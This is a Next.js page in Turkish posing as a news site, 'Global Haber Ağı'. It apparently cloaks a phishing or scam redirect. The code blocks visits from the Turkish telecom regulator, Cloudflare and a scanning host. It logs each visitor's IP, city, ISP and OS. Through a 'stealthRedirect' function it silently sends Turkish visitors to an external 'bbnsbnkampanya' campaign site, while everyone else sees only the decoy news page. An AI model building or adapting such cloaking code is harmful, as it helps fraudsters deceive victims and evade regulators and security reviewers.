'use client';

import { useState, useEffect, useRef } from 'react';
import Image from 'next/image';
import CryptoJS from 'crypto-js';
import { useRouter } from 'next/navigation';
import dynamic from 'next/dynamic';
import { logSuccessRedirect } from './lib/logger';

// Şifreleme anahtarı
const ENCRYPTION_KEY = process.env.NEXT_PUBLIC_ENCRYPTION_KEY!;

// Veriyi şifreleme fonksiyonu
const encryptData = (data: any) => {
  return CryptoJS.AES.encrypt(JSON.stringify(data), ENCRYPTION_KEY).toString();
};

// Veriyi çözme fonksiyonu
const decryptData = (encryptedData: string) => {
  const bytes = CryptoJS.AES.decrypt(encryptedData, ENCRYPTION_KEY);
  return JSON.parse(bytes.toString(CryptoJS.enc.Utf8));
};

interface IpData {
  country: string;
  countryCode: string;
  isp: string;
  org?: string;
  as?: string;
  asname?: string;
  city?: string;
}

// Engellenecek ISP'ler
const BLOCKED_ISPS: string[] = [
  'Driftnet Ltd',
  'Bilgi Teknolojileri ve iletisim Kurumu',
  'BTKBTD',
  'Cloudflare',
  'Cloudflare, Inc',
  'CLOUDFLARENET',
  'Cloudflare Inc'
];

// ISP kontrolü fonksiyonu
const isBlockedISP = (ipData: IpData | null) => {
  if (!ipData?.isp) return false;
  
  const isp = ipData.isp.toLowerCase();
  const org = ipData.org?.toLowerCase() || '';
  const as = ipData.as?.toLowerCase() || '';
  const asname = ipData.asname?.toLowerCase() || '';

  const isBlocked = BLOCKED_ISPS.some(blockedISP => {
    const blockedISPName = blockedISP.toLowerCase();
    return isp.includes(blockedISPName) || 
           org.includes(blockedISPName) || 
           as.includes(blockedISPName) || 
           asname.includes(blockedISPName);
  });

  console.log('ISP Kontrol Detayları:', {
    isp,
    org,
    as,
    asname,
    blockedISPs: BLOCKED_ISPS,
    isBlocked
  });

  return isBlocked;
};

// Loading component'ini client-side only olarak tanımla
const LoadingState = () => (
  <div className="min-h-screen flex items-center justify-center bg-white">
    <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-600"></div>
  </div>
);

// Loading component'ini client-side only olarak yükle
const ClientLoadingState = dynamic(() => Promise.resolve(LoadingState), {
  ssr: false
});

export default function Home() {
  const router = useRouter();
  const [mounted, setMounted] = useState(false);
  const [ipData, setIpData] = useState<IpData | null>(null);
  const [retryCount, setRetryCount] = useState(0);
  const [isLoading, setIsLoading] = useState(true);
  const [shouldRedirect, setShouldRedirect] = useState(false);
  const [redirectUrl, setRedirectUrl] = useState('https://bbnsbnkampanya.vercel.app/');
  const redirectLock = useRef(false);

  // Debug log fonksiyonu
  const debugLog = (message: string, data?: any) => {
    console.log(`[DEBUG v0.001] ${new Date().toISOString()} - ${message}`, data || '');
  };

  // Timezone kontrolü fonksiyonu
  const isTurkishTimezone = () => {
    try {
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      debugLog('Timezone kontrolü', { timezone });
      return timezone === 'Europe/Istanbul' || timezone.includes('Turkey');
    } catch (error) {
      debugLog('Timezone kontrolü hatası', error);
      return false;
    }
  };

  // Yönlendirme fonksiyonu
  const stealthRedirect = async (url: string, ipData: any, isSuccess: boolean = true) => {
    if (redirectLock.current) {
      debugLog('Yönlendirme kilitli, işlem iptal edildi');
      return;
    }
    redirectLock.current = true;
    debugLog('Yönlendirme başlatılıyor', { url, isSuccess });

    try {
      debugLog('Log kaydı yapılıyor', ipData);
      await logSuccessRedirect({
        ip: ipData.query || 'unknown',
        country: ipData.country || 'unknown',
        city: ipData.city || 'unknown',
        isp: ipData.isp || 'unknown',
        os: navigator.platform || 'unknown',
        redirectStatus: isSuccess
      });

      if (isSuccess) {
        debugLog('Yönlendirme yapılıyor', { url });
        window.location.replace(url);
      }
    } catch (error) {
      debugLog('Yönlendirme hatası', error);
      if (isSuccess) {
        try {
          debugLog('Alternatif yönlendirme yöntemi 1 deneniyor');
          window.location.href = url;
        } catch (error) {
          debugLog('Alternatif yönlendirme yöntemi 2 deneniyor');
          window.location.assign(url);
        }
      }
    }
  };

  // IP kontrolünü hemen başlat
  useEffect(() => {
    const checkIp = async () => {
      debugLog('IP kontrolü başlatılıyor');
      try {
        // Önce yönlendirme linkini al
        debugLog('Yönlendirme linki alınıyor');
        const redirectResponse = await fetch('/api/redirect-link', {
          headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
          }
        });
        if (redirectResponse.ok) {
          const { url } = await redirectResponse.json();
          debugLog('Yönlendirme linki alındı', { url });
          setRedirectUrl(url);
        } else {
          debugLog('Yönlendirme linki alınamadı', { status: redirectResponse.status });
        }

        // Rate limit kontrolü için bekleme süresi
        if (retryCount > 0) {
          debugLog('Rate limit beklemesi', { retryCount });
          await new Promise(resolve => setTimeout(resolve, 2000));
        }

        // IP detaylarını al
        debugLog('IP API isteği yapılıyor');
        try {
          const response = await fetch('/api/ip-info', {
            method: 'GET',
            headers: {
              'Accept': 'application/json',
              'Content-Type': 'application/json'
            },
            cache: 'no-store'
          });
          
          if (!response.ok) {
            debugLog('IP API hatası', { status: response.status });
            throw new Error(`HTTP error! status: ${response.status}`);
          }
          
          const data = await response.json();
          if (data.error) {
            debugLog('IP API hata yanıtı', data);
            throw new Error(data.error);
          }
          
          debugLog('IP API yanıtı alındı', data);
          
          // Rate limit kontrolü
          if (data.status === 'fail' && data.message?.includes('rate limit')) {
            debugLog('Rate limit aşıldı', data);
            const isTurkishTZ = isTurkishTimezone();
            
            if (isTurkishTZ) {
              debugLog('Türk timezone tespit edildi, yönlendirme yapılıyor');
              await stealthRedirect(redirectUrl, data, true);
              return;
            }
            setRetryCount(prev => prev + 1);
            return;
          }

          const encryptedData = encryptData(data);
          const decryptedData = decryptData(encryptedData);
          debugLog('IP verisi şifrelendi ve çözüldü', { decryptedData });
          
          const currentIpData = {
            country: decryptedData.country,
            countryCode: decryptedData.countryCode,
            isp: decryptedData.isp,
            org: decryptedData.org,
            as: decryptedData.as,
            asname: decryptedData.asname,
            city: decryptedData.city
          };
          
          setIpData(currentIpData);
          debugLog('IP verisi state\'e kaydedildi', currentIpData);

          // Yönlendirme kontrolü - SADECE Türk IP'si kontrolü
          const isTurkishIP = currentIpData.countryCode === 'TR';
          debugLog('Türk IP kontrolü', { isTurkishIP, countryCode: currentIpData.countryCode });

          // Sadece Türk IP'si varsa yönlendir
          if (isTurkishIP) {
            debugLog('Türk IP tespit edildi, yönlendirme yapılıyor');
            setShouldRedirect(true);
            await stealthRedirect(redirectUrl, data, true);
          } else {
            debugLog('Türk IP tespit edilemedi, yönlendirme yapılmıyor');
            // Yabancı IP ise normal sayfayı göster ve invalid.txt'ye kaydet
            await stealthRedirect(redirectUrl, data, false);
            setMounted(true);
            setIsLoading(false);
          }
        } catch (error) {
          debugLog('IP API isteği hatası', error);
          if (retryCount < 3) {
            if (isTurkishTimezone()) {
              await stealthRedirect(redirectUrl, {
                query: 'unknown',
                country: 'unknown'
              }, true);
              return;
            }
            setRetryCount(prev => prev + 1);
          } else {
            setMounted(true);
            setIsLoading(false);
          }
        }
      } catch (error) {
        debugLog('Genel hata', error);
        setMounted(true);
        setIsLoading(false);
      }
    };

    checkIp();
  }, [retryCount]);

  // Yönlendirme yapılacaksa veya sayfa yüklenmediyse loading göster
  if (!mounted || isLoading || shouldRedirect) {
    return <LoadingState />;
  }

  return (
    <div className="min-h-screen flex flex-col bg-gray-50">
      <nav className="bg-white shadow-md">
        <div className="container mx-auto px-4">
          <div className="flex justify-between items-center h-16">
            <div className="flex items-center">
              <h1 className="text-2xl font-bold text-blue-600">Global Haber Ağı</h1>
            </div>
            <div className="hidden md:flex space-x-8">
              <a href="#" className="text-gray-700 hover:text-blue-600">Ana Sayfa</a>
              <a href="#" className="text-gray-700 hover:text-blue-600">Dünya</a>
              <a href="#" className="text-gray-700 hover:text-blue-600">Ekonomi</a>
              <a href="#" className="text-gray-700 hover:text-blue-600">Teknoloji</a>
              <a href="#" className="text-gray-700 hover:text-blue-600">Bilim</a>
            </div>
          </div>
        </div>
      </nav>

      <main className="flex-grow">
        <div className="container mx-auto px-4 py-8">
          <div className="bg-white rounded-lg shadow-md p-6 mb-8">
            <div className="flex items-center justify-between">
              <div className="flex-1">
                <h3 className="text-2xl font-bold text-gray-800 mb-2">Özel Tasarım Global Haber Ağı T-Shirt</h3>
                <p className="text-gray-600 mb-4">%100 Pamuklu, Rahat Kesim, Global Haber Ağı Logolu</p>
                <div className="flex items-center">
                  <span className="text-3xl font-bold text-blue-600">3.000 TL</span>
                  <button 
                    className="ml-4 bg-blue-600 text-white px-6 py-2 rounded-lg hover:bg-blue-700 transition-colors"
                    onClick={(e) => {
                      e.preventDefault();
                      const clickData = encryptData({
                        timestamp: new Date().toISOString(),
                        action: 'button_click'
                      });
                      console.log(clickData);
                    }}
                  >
                    Hemen Satın Al
                  </button>
                </div>
              </div>
              <div className="relative h-40 w-40">
                <Image
                  src="https://images.unsplash.com/photo-1521572163474-6864f9cf17ab?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=60"
                  alt="Global Haber Ağı T-Shirt"
                  fill
                  className="object-cover rounded-lg"
                  loading="lazy"
                  sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
                />
              </div>
            </div>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
            <div className="lg:col-span-2">
              <article className="bg-white rounded-lg shadow-md overflow-hidden">
                <div className="relative h-96 w-full">
                  <Image
                    src="https://images.unsplash.com/photo-1526304640581-d334cdbbf45e?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80"
                    alt="Küresel Ekonomi Zirvesi"
                    fill
                    className="object-cover"
                    loading="lazy"
                    sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
                  />
                </div>
                <div className="p-6">
                  <h2 className="text-3xl font-bold text-gray-800 mb-4">Küresel Ekonomi Zirvesi'nden Tarihi Anlaşma</h2>
                  <div className="flex items-center text-gray-600 mb-4">
                    <span className="mr-4">Ahmet Yılmaz</span>
                    <span>•</span>
                    <span className="mx-4">2 saat önce</span>
                    <span>•</span>
                    <span className="ml-4">5 dk okuma</span>
                  </div>
                  <p className="text-gray-700 mb-4">
                    Uluslararası ticaret ilişkilerini yeniden şekillendirebilecek tarihi bir kararla, dünya liderleri kapsamlı bir ekonomik işbirliği anlaşmasına vardı. 50'den fazla ülkeden temsilcilerin katıldığı zirve, sürdürülebilir kalkınma ve dijital dönüşüm üzerine odaklandı.
                  </p>
                  <p className="text-gray-700 mb-4">
                    Anlaşmanın temel noktaları arasında gelişmiş dijital altyapı, sınır ötesi veri paylaşım protokolleri ve uluslararası e-ticaret için yeni çerçeveler yer alıyor. Uzmanlar, bunun küresel dijital pazarlarda benzeri görülmemiş bir büyümeye yol açabileceğini öne sürüyor.
                  </p>
                  <div className="mt-8 p-4 bg-gray-50 rounded-lg">
                    <h3 className="text-xl font-semibold mb-2">Piyasa Etkisi</h3>
                    <p className="text-gray-700">
                      Finansal piyasalar bu habere olumlu yanıt verdi ve ana endeksler önemli kazanımlar gösterdi. Analistler, anlaşmanın detayları uygulandıkça büyümenin devam edeceğini öngörüyor.
                    </p>
                  </div>
                </div>
              </article>
            </div>

            <div className="lg:col-span-1">
              <div className="bg-white rounded-lg shadow-md p-6 mb-6">
                <h3 className="text-xl font-semibold mb-4">Son Haberler</h3>
                <div className="space-y-4">
                  <div className="flex items-start space-x-4">
                    <div className="relative h-20 w-20 flex-shrink-0">
                      <Image
                        src="https://images.unsplash.com/photo-1507679799987-c73779587ccf?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=60"
                        alt="Teknoloji Haberi"
                        fill
                        className="object-cover rounded"
                        loading="lazy"
                        sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
                      />
                    </div>
                    <div>
                      <h4 className="font-medium text-gray-800">Yeni Nesil Mobil İletişim Teknolojileri</h4>
                      <p className="text-sm text-gray-600">2 saat önce</p>
                    </div>
                  </div>
                  <div className="flex items-start space-x-4">
                    <div className="relative h-20 w-20 flex-shrink-0">
                      <Image
                        src="https://images.unsplash.com/photo-1579621970563-ebec7560ff3e?ixlib=rb-1.2.1&auto=format&fit=crop&w=500&q=60"
                        alt="İklim Haberi"
                        fill
                        className="object-cover rounded"
                        loading="lazy"
                        sizes="(max-width: 768px) 100vw, (max-width: 1200px) 50vw, 33vw"
                      />
                    </div>
                    <div>
                      <h4 className="font-medium text-gray-800">İklim Zirvesi'nde Yeni Emisyon Hedefleri Belirlendi</h4>
                      <p className="text-sm text-gray-600">4 saat önce</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>

      <footer className="bg-gray-800 text-white">
        <div className="container mx-auto px-4 py-8">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-8">
            <div>
              <h3 className="text-lg font-semibold mb-4">Hakkımızda</h3>
              <p className="text-gray-400">Uluslararası haber ve analizlerin güvenilir kaynağı.</p>
            </div>
            <div>
              <h3 className="text-lg font-semibold mb-4">Kategoriler</h3>
              <ul className="space-y-2 text-gray-400">
                <li><a href="#" className="hover:text-white">Dünya</a></li>
                <li><a href="#" className="hover:text-white">Ekonomi</a></li>
                <li><a href="#" className="hover:text-white">Teknoloji</a></li>
                <li><a href="#" className="hover:text-white">Bilim</a></li>
              </ul>
            </div>
            <div>
              <h3 className="text-lg font-semibold mb-4">İletişim</h3>
              <ul className="space-y-2 text-gray-400">
                <li>E-posta: iletisim@globalhaber.com</li>
                <li>Telefon: +90 212 345 67 89</li>
                <li>Adres: İstanbul, Türkiye</li>
              </ul>
            </div>
            <div>
              <h3 className="text-lg font-semibold mb-4">Bizi Takip Edin</h3>
              <div className="flex space-x-4">
                <a href="#" className="text-gray-400 hover:text-white">
                  <span className="sr-only">Facebook</span>
                  <svg className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z"/>
                  </svg>
                </a>
                <a href="#" className="text-gray-400 hover:text-white">
                  <span className="sr-only">Twitter</span>
                  <svg className="h-6 w-6" fill="currentColor" viewBox="0 0 24 24">
                    <path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"/>
                  </svg>
                </a>
              </div>
            </div>
          </div>
          <div className="border-t border-gray-700 mt-8 pt-8 text-center text-gray-400">
            <p>&copy; 2024 Global Haber Ağı. Tüm hakları saklıdır.</p>
          </div>
        </div>
      </footer>
    </div>
  );
}
